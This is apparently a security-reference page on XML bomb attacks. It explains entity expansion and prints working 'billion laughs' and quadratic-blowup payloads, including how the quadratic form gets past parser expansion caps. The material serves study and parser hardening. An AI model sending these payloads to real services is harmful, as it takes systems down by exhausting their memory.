---
title: "XML bomb entity-expansion denial of service"
description: "Nested internal entities expand exponentially, turning a few kilobytes of XML into gigabytes in memory and exhausting the parser."
keywords:
  - XML bomb
  - billion laughs
  - entity expansion
  - quadratic blowup
  - denial of service
---

# XML bomb

An XML bomb needs no external resource and no network at all. It abuses **internal** general-entity expansion: an entity may reference other entities, and a parser that expands them eagerly will build the fully resolved string in memory. By nesting references so each layer multiplies the one below, a tiny document forces the parser to allocate an enormous output, exhausting memory or CPU and taking the service down.

## Billion laughs

The canonical form chains entities, each defined as ten copies of the previous one (this payload defines nine levels):

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Each level multiplies by ten, so with nine levels `&lol9;` expands to 10^8 copies of the three-byte string `lol`, roughly 300 megabytes, from a document under a kilobyte (adding a tenth level reaches the 10^9 / ~3 GB that gives the attack its "billion laughs" name). The reference is `&lol9;` placed once in the body. Expansion is exponential in the number of declared levels, so adding entities grows the payload geometrically while the source file barely changes size.

The same structure with fewer levels still demonstrates the mechanism while staying easy to reason about:

```xml
<!DOCTYPE lolz [
  <!ENTITY a "aaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<lolz>&d;</lolz>
```

## Quadratic blowup

Many parsers now cap the number of entity expansions or the total expanded size, which defeats the deeply nested exponential form. The **quadratic blowup** variant evades those caps by using a single large entity referenced many times, so the expansion count stays modest while the output size still explodes.

```xml
<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaa...aaaa">
]>
<bomb>&a;&a;&a;&a;&a; ...tens of thousands of references... &a;</bomb>
```

Define one entity holding a large block (for example 50,000 characters), then reference it tens of thousands of times in the body. If the entity is *n* bytes and is referenced *n* times, the parser materializes *n*-squared bytes, so a few hundred kilobytes of source becomes gigabytes of resolved text. Because there is only one level of indirection, per-entity depth limits do not trigger, and the reference count stays under naive expansion counters while memory and CPU still climb to exhaustion.

Parameter-entity variants of both forms exist for DTD-processing contexts, and the same multiplication applies when the expanded value is copied into a parameter entity instead of the document body.

## References

- [OWASP: XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PayloadsAllTheThings: XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
